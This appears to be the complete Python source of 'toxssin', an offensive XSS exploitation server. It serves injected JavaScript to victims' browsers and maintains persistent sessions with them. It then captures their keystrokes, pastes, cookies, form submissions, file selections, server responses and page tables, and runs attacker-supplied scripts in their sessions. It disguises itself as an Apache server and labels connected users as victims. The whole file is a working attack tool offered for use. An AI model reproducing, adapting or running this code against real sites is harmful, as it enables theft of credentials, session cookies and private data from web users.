#!/bin/python3
# 
# Author: Panagiotis Chartas (t3l3machus)
# https://github.com/t3l3machus

from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl, sys, argparse, base64, re, os, readline
from warnings import filterwarnings
from subprocess import check_output
from datetime import date, datetime
from ast import literal_eval
from urllib.parse import unquote, urlparse
from validators import url as validate_url
from uuid import uuid4
from pandas import read_html, DataFrame
from IPython.display import display
from threading import Thread
from io import StringIO

filterwarnings("ignore", category = DeprecationWarning) 

# Generate self-signed certificate:
# openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

''' Colors '''
MAIN = '\033[38;5;50m'
GREEN = '\033[38;5;82m'
BLUE = '\033[0;38;5;12m'
LPURPLE = '\033[0;38;5;201m'
ORANGE = '\033[0;38;5;214m'
ORANGEB = '\033[1;38;5;214m'
PURPLE = '\033[0;38;5;141m'
B_PURPLE = '\033[45m'
YELLOW="\033[0;38;5;11m"
RED = '\033[1;31m'
B_RED = '\033[41m'
END = '\033[0m'
B_END = '\033[49m'
BOLD = '\033[1m'
ULINE = '\033[4m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
KEY = f'{ORANGE}Keystroke{END}'
PASTE = f'{BLUE}Paste{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
FORM = f'{RED}Form-Submission-Intercepted{END}'
FILE = f'{RED}File-Selection-Intercepted{END}'
TABLE = f'{RED}Table-Data-Intercepted{END}'
LINK = f'{RED}Link{END}'
RESPONSE = f'{RED}Server-Response-Intercepted{END}'
REQ = f'{BOLD}Request{END}'
SPIDER = f'{B_PURPLE}{BOLD}Spider{END}{B_END}'
CHANGE = f'{ORANGE}Input-Value-Changed{END}'


# -------------- Arguments & Usage -------------- #
parser = argparse.ArgumentParser()

parser.add_argument("-u", "--url", action="store", help = "Your toxssin server URL (e.g., https://your.domain.com, https://127.0.0.1)", required = True)
parser.add_argument("-c", "--certfile", action="store", help = "Your certificate.", required = True)
parser.add_argument("-k", "--keyfile", action="store", help = "The private key for your certificate. ", required = True)
parser.add_argument("-p", "--port", action="store", help = "Port number to start the local toxssin https server (default: 443). Careful! This option does not set the port in the payload or the malicious URLs generated on start up automatically. If you want to use a non-standard port both for the server and the URLs pointing to it, you must append it in the server URL as well (e.g., ./toxssin.py -u https://toxssin.com:9001 -p 9001 ...)", type = int) 
parser.add_argument("-s", "--script-name", action="store", help = "Change JS handler script name (default: handler.js)", type=str)
parser.add_argument("-e", "--elements", action="store", help = "Html elements to poison (default: input[type='text'], input[type='password'], input[type='date'], input[type='email'], input[type='datetime-local'], input[type='hidden'], input[type='number'], input[type='search'], input[type='url'], input[type='radio'], input[type='checkbox'], select, textarea)\n*Forms, tables and file inputs are poisoned by default.", type=str)
parser.add_argument("-f", "--frequency", action="store", help = "Change html elements poisoning cycle frequency (default: 3000 ms)", type=int)
parser.add_argument("-a", "--cookie-age", action="store", help = "Toxssin cookie max age in days (default: 30)", type=int)
parser.add_argument("-t", "--no-tables", action="store_true", help = "Disable html tables spidering")
parser.add_argument("-g", "--grab-poisoned", action="store_true", help = "Identify and re-establish sessions sourcing from cached content (default: False)")
parser.add_argument("-v", "--verbose", action="store_true", help = "Verbose output (prepare for long stdout)")
parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup")

args = parser.parse_args()

if args.url:
	try:
		toxssin_server_url = args.url
		
		if re.search("http://", toxssin_server_url):
			exit(f'\n[{FAILED}] - {BOLD}Toxssin requires https to run. The attack will most likely fail otherwise.{END}\n')
		
		tmp = toxssin_server_url.split('/')
		toxssin_server_url = '/'.join(tmp[:3])
		
		if not validate_url(toxssin_server_url):
			exit(f'\n[{FAILED}] - {BOLD}Invalid server base url.{END}\n')
		
	except IndexError:
		parser.print_usage()
		sys.exit(1)
	 

# -------------- General Functions -------------- #                                                            
def print_banner():
	
	padding = '  '
	 
	banner = [
		f'{padding}  ,d                                                   88             ',
		f'{padding}  88                                                   ""             ',
		f'{padding}MM88MMM  ,adPPYba,  8b,     ,d8  ,adPPYba,  ,adPPYba,  88  8b,dPPYba, ',
		f'{padding}  8f    a8"     "8a  `Y8, ,8P\'   I8[    ""  I8[    ""  d8  88P\'   `"8a',
		f'{padding}  EA    8b       d8    )8X8(      `"Y8ba,    `"Y8ba,   Ew  8t       R7',
		f'{padding}  8X,   "8a,   ,a8"  ,d8" "8b,   aa    ]8I  aa    ]8I  AJ  DK       HK',
		f'{padding}  "Yf8N  `"YbbdP"\'  8P\'     `Y8  `"YbbdP"\'  `"YbbdP"\'  A8  85       88'
	]

	txt_color = 117
	print('\r')
	
	for line in banner:
		color = f'\033[38;5;{txt_color}m'
		print(f'{color}{line}{END}')
		txt_color += 1

	print(f'{padding}\t\t\t\t\t           Created by t3l3machus\n')



def removeBoundaries(data):

	data = data.split('\n')
	data = data[2:-3]
	filtered = ""

	for line in data:
		filtered += f'{line}\n'
		
	return filtered



def printRemoveEmptyLines(txt):
	
	lines = txt.split("\n")
	non_empty_lines = [line for line in lines if line.strip() != ""]
	filtered = ""

	for line in non_empty_lines:
		filtered += f'{line}\n'
	
	print(f'\r{GREEN}{filtered}{END}')



def print_green(msg):
	
	print(f'{GREEN}{msg}{END}')
	


def rst_prompt(force_rst = False):
	
	if Toxssin.rst_promt_required or force_rst:
		sys.stdout.write('\r' + prompt + readline.get_line_buffer())
		#sys.stdout.flush()
		Toxssin.rst_promt_required = False	



def echo_log(msg, toxssin_id, green = False, echo = False, rst = True):
	
	print_green('\r' + msg) if (green and Toxssin.active == toxssin_id) else chill()
	print('\r' + msg) if (green == False and Toxssin.active == toxssin_id) else chill()
	print('\r' + msg) if (echo and Toxssin.active != toxssin_id) else chill()
	
	with open(msg_log[toxssin_id], 'a') as log:
		log.write(msg + '\n') if green == False else chill
		log.write(f'{GREEN}{msg}{END}\n') if green else chill
	


def print_post_body(data):

	if type(data) is str:
		printRemoveEmptyLines(unquote(data))		
	
	else:
		echo_log(f'[{datetime_prefix[1]}] [{WARN}] {BOLD}Decoding data to utf-8 failed. Printing raw data:{END}', toxssin_id)
		print(f'\r{GREEN}{unquote(data)}{END}')
	
	

def log_capture(src, timestamp, data, action, toxssin_id):
	
	fid = str(uuid4()).replace('-', '')[0:12]
	filename = f'{src}_{fid}'

	with open(f'{session_folder[toxssin_id]}/{filename}', 'a') as f:
		f.write(f'{timestamp}\n\n')
		f.write(f'{action}\n\n') if src != 'file-selection' else chill()
		
		try:
			data = data.decode('utf-8') + '\n'
			
			if src == 'response-intercept' or src == 'table':
				data = removeBoundaries(data)
			
			if src == 'table':
				try:
					table_data = read_html(data, displayed_only=True, keep_default_na=False)[0]
					df = DataFrame(table_data)
					df_str = df.to_string()
					f.write(df_str + '\n') if df_str not in [None, 'None'] else chill()
					
				except IndexError:
					df = None
					pass
					
			else:
				f.write(str(data)) 
				
		except UnicodeDecodeError:
			echo_log(f'  {ORANGE}Decoding data to UTF-8 failed. Writing raw data...{END}', toxssin_id)				
			f.write(str(data))
	
	print_post_body(data) if verbose and Toxssin.active == toxssin_id and src != 'table' else chill()
	
	if src != 'table':
		echo_log(f'  {BOLD}Saved in {GREEN}{session_folder[toxssin_id]}/{filename}{END}\n', toxssin_id)
		
	elif src == 'table' and Toxssin.active == toxssin_id:
		
		if isinstance(df, DataFrame):
			buffer = StringIO()
			df.info(verbose = True, show_counts = False, buf = buffer)
			s = buffer.getvalue()
			echo_log(str(df) + '\n', toxssin_id, green = True) if verbose else echo_log(s[38:], toxssin_id, green = True)
			echo_log(f'  {BOLD}Table data saved in {GREEN}{session_folder[toxssin_id]}/{filename}{END}\n', toxssin_id) 
			
		else:
			echo_log(f'  {BOLD}Table empty. Omitting.{END}\n', toxssin_id)


		
def get_dt_prefix():
	
	now = datetime.now()
	today = date.today()
	current_time = now.strftime("%H:%M:%S")
	#datetime_prefix = f'{today.strftime("%Y-%m-%d")} {current_time}'
	datetime_prefix = [today.strftime("%Y-%m-%d"), current_time]
	return datetime_prefix


def chill():
	pass


skull = '''
                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"
'''


# -------------- Basic Settings -------------- #
prompt = "toxssin > "
session_folder = {}
msg_log = {}
verbose = True if args.verbose else False
quiet = True if args.quiet else False
spider_tables = 'false' if args.no_tables else 'true'
poison_elements = args.elements if args.elements else "input[type='text'], input[type='password'], input[type='search'], input[type='date'], input[type='email'], input[type='datetime-local'], input[type='hidden'], input[type='number'], input[type='search'], input[type='url'], input[type='radio'], input[type='checkbox'], select, textarea"
handler = args.script_name if args.script_name else 'handler.js'
frequency = str(args.frequency) if args.frequency else '3000'
cookie_age = str(args.cookie_age) if args.cookie_age else '30'
grab_poisoned = True if args.grab_poisoned else False
	

# -------------- Toxssin Server -------------- #
class Toxssin(BaseHTTPRequestHandler):
	
	logs_dir = f'{os.path.expanduser("~")}/.local/toxssin'
	execution_verified = []
	victims = {}
	active = None
	rst_promt_required = False
	command_pool = []
	
	preferences = {
		'*TOXSSIN_SERVER*' : toxssin_server_url,
		'*POISON_HASH_LINKS*' : 'false',
		'*HANDLER*' : handler,
		'*POISON_ELEMENTS*' : poison_elements,
		'*POISON_FREQUENCY*' : frequency,
		'*SPIDER_TABLES*' : spider_tables,		
		'*SESSIONID*' : None		
	}
	
	
	
	def establish(toxssin_id, client_address, origin, user_agent, timestamp, grabbed = False):
		_date = get_dt_prefix()[0]
		domain = urlparse(origin).netloc
		os.makedirs(f'{Toxssin.logs_dir}/{_date}/{domain}/{client_address}_{timestamp}')
		session_folder[toxssin_id] = f'{Toxssin.logs_dir}/{_date}/{domain}/{client_address}_{timestamp}'
		msg_log[toxssin_id] = f"{session_folder[toxssin_id]}/main.log"

		Toxssin.execution_verified.append(toxssin_id)
		Toxssin.active = toxssin_id if Toxssin.active == None else Toxssin.active
		Toxssin.victims[toxssin_id] = {
			'ip' : client_address,
			'origin' : origin,
			'user-agent' : user_agent,
			'cookie' : None
		}

		if grabbed:
			datetime_prefix = get_dt_prefix()[1]
			state_msg = 'Being logged in the background' if Toxssin.active != toxssin_id else 'Currently in view (Active)'
			
			echo_log(f'\r[{datetime_prefix}] [{B_RED}{REQ}{B_END}] {BOLD}Grabbed session from poisoned traffic! MITM attack launched against victims\'s browser:{END}', toxssin_id, echo = True)
			echo_log(f'              ├─[{PURPLE}Client-IP{END}] -> {BOLD}{client_address}{END}', toxssin_id, echo = True)
			echo_log(f'              ├─[{PURPLE}Origin{END}] -> {BOLD}{origin}{END}', toxssin_id, echo = True)
			echo_log(f'              ├─[{PURPLE}User-Agent{END}] -> {BOLD}{user_agent}{END}', toxssin_id, echo = True)	
			echo_log(f'              └─[{PURPLE}State{END}] -> {BOLD}{state_msg}{END}\n', toxssin_id, echo = True)
			rst_prompt(force_rst = True)	
						
		
	def do_GET(self):
		
		try:
			timestamp = datetime.now().timestamp()
			global session_folder, msg_log, handler		
			datetime_prefix = get_dt_prefix()		
			self.server_version = "Apache/2.4.1"
			self.sys_version = ""	
			toxssin_id = self.headers.get("X-toxssin-id") if self.path != f'/{handler}' else ''
			Toxssin.rst_promt_required = True if toxssin_id == Toxssin.active else False

			try:
				if grab_poisoned and (len(toxssin_id) == 32) and (toxssin_id not in Toxssin.execution_verified) and (self.path != f'/{handler}'):
					Toxssin.establish(toxssin_id, self.client_address[0], self.headers["Origin"], self.headers["User-Agent"], timestamp, grabbed = True)
					rst_prompt(force_rst = True)

			except TypeError:
				pass


			if self.path == f'/{handler}':

				self.send_response(200)
				self.send_header('Content-type', 'text/javascript; charset=UTF-8')
				self.send_header('Access-Control-Allow-Origin', '*')
				self.end_headers()								
				handler_src = open(f'./handler.js', 'r')
				payload = handler_src.read()
				handler_src.close()
				payload = payload.replace('*TOXSSIN_SERVER*', Toxssin.preferences["*TOXSSIN_SERVER*"]).replace('*COOKIE_AGE*', cookie_age)			
				self.wfile.write(bytes(payload, "utf-8"))


			# toxin
			elif re.search('c1cbfe271a40788a00e8bf8574d94d4b', self.path):

				session_data = self.path.split('/')
				toxssin_id = session_data[2]
				state = session_data[3]						
				self.send_response(200)
				self.send_header('Content-type', 'text/javascript; charset=UTF-8')
				self.send_header('Access-Control-Allow-Origin', '*') 
				#self.send_header('Access-Control-Allow-Credentials', 'true')
				self.send_header('Expires', 'Expires: Wed, 28 Oct 2050 11:00:00 GMT')
				self.end_headers()

				toxin = open(f'./toxin.js', 'r')
				js_poison = toxin.read()
				toxin.close()
				Toxssin.preferences["*SESSIONID*"] = toxssin_id

				for key, value in Toxssin.preferences.items():
					js_poison = js_poison.replace(key, value)

				self.wfile.write(bytes(js_poison, "utf-8"))

				# initiate logging
				if toxssin_id not in Toxssin.execution_verified:
					exists = False
					Toxssin.establish(toxssin_id, self.client_address[0], self.headers["Origin"], self.headers["User-Agent"], timestamp)

				else:
					exists = True

				if state == 'init':
					echo_log(f'\r[{datetime_prefix[1]}] [{B_RED}{REQ}{B_END}] {BOLD}Received request for toxin! MITM attack launched against victims\'s browser!{END}', toxssin_id, echo = True)
					rst_prompt()

				elif state == 'found' and exists:
					echo_log(f'\r[{datetime_prefix[1]}] [{SPIDER}] {BOLD}Received request for toxin from an active session. XSS persistence was successful!{END}', toxssin_id, echo = True)
					rst_prompt()

				elif state == 'found' and not exists:
					echo_log(f'\r[{datetime_prefix[1]}] [{B_RED}{REQ}{B_END}] {BOLD}Received request for toxin from an older session. MITM attack launched against victims\'s browser!{END}', toxssin_id, echo = True)
					rst_prompt()

				else:
					echo_log(f'\r[{datetime_prefix[1]}] [{WARN}] {BOLD}Received request for toxin but session state was not determined.{END}', toxssin_id, echo = True)	

				if (state == 'init') or (state == 'found' and not exists):
					state_msg = 'Being logged in the background' if Toxssin.active != toxssin_id else 'Currently in view (Active)'
					echo_log(f'              ├─[{PURPLE}Client-IP{END}] -> {BOLD}{self.client_address[0]}{END}', toxssin_id, echo = True) #:{self.client_address[1]}
					echo_log(f'              ├─[{PURPLE}Origin{END}] -> {BOLD}{self.headers["Origin"]}{END}', toxssin_id, echo = True)
					echo_log(f'              ├─[{PURPLE}User-Agent{END}] -> {BOLD}{self.headers["User-Agent"]}{END}', toxssin_id, echo = True)
					echo_log(f'              └─[{PURPLE}State{END}] -> {BOLD}{state_msg}{END}\n', toxssin_id, echo = True)

					rst_prompt(force_rst = True)


			# Command exec
			elif re.search('a95f7870b615a4df433314f10da26548', self.path):

				self.send_response(200)
				self.send_header('Access-Control-Allow-Origin', '*')
				path_to_cmd = False		

				if len(Toxssin.command_pool) > 0:
					if any(toxssin_id in cmd for cmd in Toxssin.command_pool):
						for i in range(0, len(Toxssin.command_pool)):
							if toxssin_id in Toxssin.command_pool[i]:
								path_to_cmd = Toxssin.command_pool.pop(i)[toxssin_id]
								break

				path_to_cmd = 'None' if not path_to_cmd else path_to_cmd
				self.send_header('Content-type', str(path_to_cmd)) if path_to_cmd != 'None' else self.send_header('Content-type', 'text/javascript; charset=UTF-8')			
				self.end_headers()

				if path_to_cmd == 'None':
					Toxssin.rst_promt_required = False
					self.wfile.write(bytes("<%NoCmdIssued%>", "utf-8"))				

				else:
					src = open(f'{path_to_cmd}', 'r')
					payload = src.read()
					src.close()				
					self.wfile.write(bytes(payload, "utf-8"))				


			elif toxssin_id in Toxssin.execution_verified:

				try:
					self.send_response(200)
					self.send_header('Content-type', 'text/javascript; charset=UTF-8')
					self.send_header('Access-Control-Allow-Origin', self.headers.get('Origin'))
					self.send_header('Access-Control-Allow-Credentials', 'true')
					self.end_headers()
					self.wfile.write(b'OK')
					capture = base64.b64decode(self.path[1:]).decode("utf-8")
					data = literal_eval('{' + unquote(capture.replace('%27', "\\'")) + '}')

					if data['event'] == 'keyup':
						stroke = data['keystroke']
						target = f'{ORANGE}Input{END}' if data['target'] == 'INPUT' else data['target'].capitalize()
						targetName = f"[Name: {data['targetName']}]" if data['targetName'] != 'undefined' else ''					
						echo_log(f'[{datetime_prefix[1]}] [{KEY}] [Type: {data["targetType"]}] [{target}]{targetName} {GREEN}{stroke}{END}', toxssin_id)


					elif data['event'] == 'paste':
						cb_data = data['data'].replace('<%LineBreak>', '\n')
						target = f'{ORANGE}Input{END}' if data['target'] == 'INPUT' else data['target'].capitalize()
						targetName = f"[Name: {data['targetName']}]" if data['targetName'] != 'undefined' else ''
						echo_log(f'[{datetime_prefix[1]}] [{PASTE}] [{target}] {targetName} {GREEN}{cb_data}{END}', toxssin_id)


					elif data['event'] == 'input-changed':
						targetName = f"[Name: {data['name']}]" if data['name'] != 'undefined' else ''
						val = data["value"].replace("<%LineBreak>", "\n")	
						echo_log(f'[{datetime_prefix[1]}] [{CHANGE}] [Type: {data["type"]}] {targetName} {GREEN}{val}{END}', toxssin_id)


					elif data['event'] == 'cookie':
						if Toxssin.victims[toxssin_id]['cookie'] == None:
							echo_log(f'[{datetime_prefix[1]}] [{ORANGE}Cookie{END}] {GREEN}{data["data"]}{END}', toxssin_id)
							Toxssin.victims[toxssin_id]['cookie'] = data["data"]

						elif Toxssin.victims[toxssin_id]['cookie'] not in [None, data["data"]]:
							echo_log(f'[{datetime_prefix[1]}] [{ORANGE}Cookie-Value-Changed{END}] {GREEN}{data["data"]}{END}', toxssin_id)
							Toxssin.victims[toxssin_id]['cookie'] = data["data"]

						else:
							Toxssin.rst_promt_required = False


					elif data['event'] == 'info':
						echo_log(f'[{datetime_prefix[1]}] [{INFO}] {data["msg"]}', toxssin_id)


				except:
					self.send_response(200)
					self.send_header('Content-Type', 'text/plain')
					self.end_headers()				
					self.wfile.write(bytes(skull, 'utf-8'))
					echo_log(f'[{datetime_prefix[1]}] [{INFO}] Received unandled request from {self.client_address[0]}', toxssin_id)		
					pass

			else:
				self.send_response(200)
				self.end_headers()
				self.wfile.write(b'UNDEFINED')
				pass

			rst_prompt()
		
		except:
			pass

		
		
	def do_POST(self):
		
		try:

			datetime_prefix = get_dt_prefix()
			self.server_version = "Apache/2.4.1"
			self.sys_version = ""
			toxssin_id = self.headers.get("X-toxssin-id") if self.headers.get("X-toxssin-id") else ''
			Toxssin.rst_promt_required = True if toxssin_id == Toxssin.active else False

			try:
				if grab_poisoned and (len(toxssin_id) == 32) and (toxssin_id not in Toxssin.execution_verified) and (self.path != f'/{handler}'):
					Toxssin.establish(toxssin_id, self.client_address[0], self.headers["Origin"], self.headers["User-Agent"], timestamp, grabbed = True)

			except TypeError:
				pass


			# Form submission intercept
			if self.path == '/d3cba2942555c79ce5b73193fd6f5614' and toxssin_id in Toxssin.execution_verified: 

				self.send_response(200)
				self.send_header('Access-Control-Allow-Origin', '*')
				self.send_header('Content-Type', 'text/plain')
				self.end_headers()
				self.wfile.write(b'OK')
				real_action = self.headers["Action"]
				content_len = int(self.headers.get('Content-Length'))
				form_attrs = {'Action':self.headers.get("X-form-action"), 'Method':self.headers.get("X-form-method"), 'Enctype':self.headers.get("X-form-enctype"), 'Encoding':self.headers.get("X-form-encoding")}
				post_data = self.rfile.read(content_len)
				echo_log(f'[{datetime_prefix[1]}] [{FORM}] ', toxssin_id, rst = False)				
				echo_log('\r', toxssin_id, rst = False)

				for attr in form_attrs.keys():
					padding = ' ' * (8 - len(attr))
					echo_log(f'  {BOLD}{padding}{attr.capitalize()}{END}: {GREEN}{form_attrs[attr]}{END}', toxssin_id, rst = False)

				echo_log(f'  {BOLD}    Data{END}:\n', toxssin_id, rst = False)
				log_capture('form-submission', ' '.join(datetime_prefix), post_data, form_attrs, toxssin_id)


			# Response Intercept
			elif self.path == '/1a60f7f722fd94513b92bd2b19c4f7d4' and toxssin_id in Toxssin.execution_verified: 

				self.send_response(200)
				self.send_header('Access-Control-Allow-Origin', '*')
				self.send_header('Content-Type', 'text/plain')
				self.end_headers()
				self.wfile.write(b'OK')
				content_len = int(self.headers.get('Content-Length'))
				response_status_code = int(self.headers.get("X-form-status"))
				response_status_text = 'Found (toxssin assumption)' if response_status_code == 302 else self.headers.get("X-form-statusText")
				response_headers = f'Status: {response_status_code} {response_status_text}\n' + self.headers.get("X-form-responseHeaders").replace("<%LineBreak>", "\n")
				post_data = self.rfile.read(content_len)

				if self.headers.get('X-form-source') == 'link':
					href = unquote(self.headers.get("X-form-href"))
					echo_log(f'[{datetime_prefix[1]}] [{LINK}] {BOLD}User clicked a link with href = {END}{GREEN}{href}{END}', toxssin_id, rst = False)

				if response_status_code == 302:
					echo_log(f'[{datetime_prefix[1]}] [{RESPONSE}] {BOLD}Response seems to be a redirect (302 Found) to the same location.{END}', toxssin_id, rst = False)

				else:
					echo_log(f'[{datetime_prefix[1]}] [{RESPONSE}] ', toxssin_id, rst = False)

				echo_log(f'\n  {BOLD}Response Headers:\n{END}', toxssin_id, rst = False)

				for header in response_headers.split('\n'):
					echo_log(f'  {header}', toxssin_id, green = True, rst = False)

				echo_log(f'  {BOLD}Response Body:\n{END}', toxssin_id, rst = False)					
				log_capture('response-intercept', f'{" ".join(datetime_prefix)}, href: {href}', post_data, response_headers, toxssin_id) if self.headers.get('X-form-source') == 'link' else log_capture('response-intercept', ' '.join(datetime_prefix), post_data, response_headers, toxssin_id)


			# File selection intercept
			elif self.path == '/7f30f7d702fd94515b82bd2b19c2f7d4' and toxssin_id in Toxssin.execution_verified:

				self.send_response(200)
				self.send_header('Access-Control-Allow-Origin', '*')
				self.send_header('Content-Type', 'text/plain')
				self.end_headers()
				self.wfile.write(b'OK')
				real_action = self.headers["Action"]
				content_len = int(self.headers.get('Content-Length'))
				post_data = self.rfile.read(content_len)
				echo_log(f'[{datetime_prefix[1]}] [{FILE}] {BOLD}File name & Content{END} (Received via POST request):\n', toxssin_id, rst = False)				
				log_capture('file-selection', ' '.join(datetime_prefix), post_data, real_action, toxssin_id)


			# Table intercept
			elif self.path == '/x8cwa2h4252tc79ce5b731r3fdc75483' and toxssin_id in Toxssin.execution_verified:

				self.send_response(200)
				self.send_header('Access-Control-Allow-Origin', '*')
				self.send_header('Content-Type', 'text/plain')
				self.end_headers()
				self.wfile.write(b'OK')
				real_action = self.headers["Action"]
				content_len = int(self.headers.get('Content-Length'))
				post_data = self.rfile.read(content_len)
				echo_log(f'[{datetime_prefix[1]}] [{TABLE}] {BOLD}Table data{END} (Received via POST request):\n', toxssin_id, rst = False)				
				log_capture('table', ' '.join(datetime_prefix), post_data, real_action, toxssin_id)			


			# Script exec results
			elif self.path == '/7f47fd7ae404fa7c0448863ac3db9c85' and toxssin_id in Toxssin.execution_verified and self.headers.get('X-form-script') not in ['null', None]:

				self.send_response(200)
				self.send_header('Access-Control-Allow-Origin', '*')
				self.send_header('Content-Type', 'text/plain')
				self.end_headers()
				self.wfile.write(b'OK')
				error_msg = 'without' if int(self.headers.get('X-form-error')) == 0 else f'{RED}with{END}'
				script = self.headers.get('X-form-script')
				content_len = int(self.headers.get('Content-Length'))
				results = self.rfile.read(content_len)
				try:
					results = results.decode('utf-8') 
				except UnicodeDecodeError:
					echo_log(f'{ORANGE}Decoding data to UTF-8 failed. Printing raw data...{END}', toxssin_id)

				echo_log(f'[{datetime_prefix[1]}] [{LPURPLE}Custom Script Exec{END}] [SID: {toxssin_id}] {BOLD}Script {ORANGE}{script}{END} {BOLD}executed {error_msg} {BOLD}error(s). Output{END}:\n{GREEN}{results}{END}', toxssin_id, echo = True, rst = False)
				rst_prompt(force_rst = True)

			else:
				self.send_response(200)
				self.end_headers()
				self.wfile.write(b'UNDEFINED POST')
				pass				

			rst_prompt()
			
		except:
			pass
			
		

	def do_OPTIONS(self):
		
		self.server_version = "Apache/2.4.1"
		self.sys_version = ""		
		self.send_response(200)
		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
		self.send_header('Vary', "Origin")
		self.send_header('Access-Control-Allow-Credentials', 'true')
		self.send_header('Access-Control-Allow-Headers', 'X-toxssin-id, X-form-error, X-form-script, X-form-action, X-form-source, X-form-href, X-form-method, X-form-enctype, X-form-encoding, X-form-status, X-form-statusText, X-form-responseHeaders')
		self.end_headers()
		self.wfile.write(b'OK')
			
			
	def log_message(self, format, *args):
		return


def main():
	
	try:
		global verbose, key_detector
		server_port = int(args.port) if args.port else 443
		
		try:
			httpd = HTTPServer(('0.0.0.0', server_port), Toxssin)
			
		except OSError:	
			exit(f'\n[{FAILED}] - {BOLD}Port {server_port} seems to already be in use.{END}\n')
		try:
			context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
			context.load_cert_chain(certfile = args.certfile, keyfile = args.keyfile)
			httpd.socket = context.wrap_socket(sock = httpd.socket, server_side= True)
		except FileNotFoundError:
			exit(f'\n[{FAILED}] Certificate or key file not found. Check your input and try again.\n')
			
		chill() if quiet else print_banner()
		
		s_url_list = toxssin_server_url.split(":")
		handler_port = f':{s_url_list[2]}' if len(s_url_list) == 3 else ''
		
		print(f'[{get_dt_prefix()[1]}] [{INFO}] Toxssin https server is up and running!')
		print(f'[{get_dt_prefix()[1]}] [{INFO}] JavaScript poison handler URL{END}: {ORANGE}{toxssin_server_url}/{handler}{END}')
		
		try:
			server_public_ip = check_output("curl --connect-timeout 3.14 -s ifconfig.me", shell = True).decode(sys.stdout.encoding)	
			print(f'[{get_dt_prefix()[1]}] [{INFO}] Public IP handler URL{END}: {ORANGE}https://{server_public_ip}{handler_port}/{handler}{END}')
			
		except:
			pass
			
		print(f'[{get_dt_prefix()[1]}] [{INFO}] Type "help" to get a list of the available commands.{END}')
		print(f'[{get_dt_prefix()[1]}] [{INFO}] All sessions are logged by default.{END}')
		print(f'[{get_dt_prefix()[1]}] [{INFO}] Awaiting XSS GET request for {handler}{END}')
			
		toxssin_server = Thread(target = httpd.serve_forever, args = ())
		toxssin_server.daemon = True
		toxssin_server.start()
		
		# Command prompt
		while True:

			user_input = input(prompt).strip().split(' ')
			cmd_list = [w for w in user_input if w]
			cmd = cmd_list[0].lower() if cmd_list else ''
			
			if cmd == 'help':
				print(
				'''
				\r  Command                    Description
				\r  -------                    -----------
				\r  help                       Print this message.
				\r  sessions                   Print all victim sessions data.
				\r  active                     Print active session data (the one that is currently printing on stdout).
				\r  activate <sid>             Change the active session by providing the session id.
				\r  flush                      Delete all current sessions (reset).
				\r  exec <JS file path> <sid>  Execute custom JS script against session by id.                  
				\r  verbose                    Enable/disable verbose mode.
				\r  clear/cls                  Clear screen.
				\r  exit/quit/q                Terminate program.
				
				\r  *All sessions are logged despite of which one is active.
				''')
				
			elif cmd == 'sessions':
				total_sessions = len(Toxssin.victims.keys())
				if total_sessions > 0:
					print(f'\n{BOLD}---------------------- ( Sessions ) ----------------------{END}')
					for key in Toxssin.victims:
						print(f'\n{BOLD}Session id{END}: {key} {GREEN}Active{END}\n{BOLD}Data{END}: {Toxssin.victims[key]}\n')	if key == Toxssin.active else print(f'\n{BOLD}Session id{END}: {key}\n{BOLD}Data{END}: {Toxssin.victims[key]}\n')
				
					print(f'{BOLD}Total{END}: {len(Toxssin.victims.keys())}\n')
					print(f'{BOLD}----------------------------------------------------------{END}\n')
				else:
					print('\nNo sessions established ¯\\_(ツ)_/¯\n')
					
					
			elif cmd == 'active':
				print(f'\n{BOLD}Session id{END}: {Toxssin.active}\n{BOLD}Data{END}: {Toxssin.victims[Toxssin.active]}\n') if Toxssin.active else print('\nNo sessions established ¯\\_(ツ)_/¯\n')


			elif cmd == 'verbose':
				verbose = not verbose
				print(f'\nVerbose mode enabled.\n') if verbose else print('\nVerbose mode disabled.\n')


			elif cmd in ['clear', 'cls']:
				os.system('clear')
			
			
			elif cmd == 'exec' and len(cmd_list) == 3:
				script = cmd_list[1].replace("~", os.path.expanduser("~"))
				
				if Toxssin.active:
					sid = Toxssin.active if cmd_list[2].lower() == 'active' else cmd_list[2]

					if os.path.exists(script):
						pair = {sid : script}
						Toxssin.command_pool.append(pair)
						print('\nScript appended for execution. Awaiting results.\n')
					else:
						print('\nFile not found.\n')
				else:
					print('\nNo sessions established ¯\\_(ツ)_/¯\n')
								
									
			elif cmd == 'flush':
				Toxssin.execution_verified = []
				Toxssin.victims = {}
				Toxssin.active = None
				print(f'\n{BOLD}All sessions deleted.{END}\n')


			elif re.search('activate', cmd) and len(cmd_list) == 2:
				sid = cmd_list[1]
				if sid == Toxssin.active:
					print(f'\n{RED}Already active.{END}\n')
					
				elif sid in Toxssin.victims:					
					mainlog = msg_log[sid]
					print(f'\n[*] Activating {sid}')
					os.system(f'cat {mainlog}')
					Toxssin.active = sid
					
				else:
					print(f'\n{RED}Invalid Session id.{END}\n')				
			
			
			elif cmd in ['exit', 'quit', 'q']:
				sys.exit(0)
			
			
			elif cmd == '':
				pass
				
			else:
				print(f'\n{RED}Invalid syntax.{END}\n')

